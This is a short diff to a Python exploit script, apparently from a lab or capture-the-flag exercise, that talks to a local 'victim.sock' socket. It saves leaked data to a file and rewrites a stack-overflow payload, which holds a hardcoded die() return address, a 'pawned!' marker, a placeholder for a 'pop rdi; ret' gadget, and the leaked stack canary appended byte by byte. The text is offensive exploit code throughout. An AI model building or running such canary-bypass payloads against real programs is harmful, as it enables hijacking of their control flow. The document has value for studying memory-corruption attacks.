@@ -1,6 +1,7 @@
+import os
 import socket
 import struct
-import sys, os
+import sys
 
 #create a socket to read from file handler
 sock = os.getenv("HOME") + "/victim.sock"
@@ -60,7 +61,11 @@ filename = 'leaked_data.txt'
 with open(filename, 'w') as file_object:
     file_object.write(write_to_file)
 
-strg = b'A' * 24
+strg = b'\xea\x4a\x55\x55\x55\x55\x00\x00' #die()
+#strg+= b'\x40\x70\xa4\xf7\xff\x7f\x00\x00' #exit()
+strg+= b'pawned!\0'
+strg+= b'' #pop rdi; ret
+
 for c in range(8):
 	strg += struct.pack('B',b_canary[c])
 
